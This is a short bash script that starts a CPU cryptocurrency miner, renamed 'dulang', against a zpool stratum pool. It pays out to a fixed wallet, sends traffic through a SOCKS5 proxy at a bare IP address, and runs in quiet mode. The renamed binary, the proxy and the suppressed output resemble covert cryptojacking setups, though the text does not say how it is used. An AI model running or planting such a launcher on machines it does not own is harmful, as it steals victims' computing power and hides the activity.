#!/bin/bash
POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
WALLET=CXLyeasEvrdrr99WdeKmeYcnDaTkAqcEAx
PROXY=socks5://154.16.63.16:1080
./dulang -a cpupower -o $POOL -u $WALLET -p c=CPU,zap=CPU -x $PROXY -q
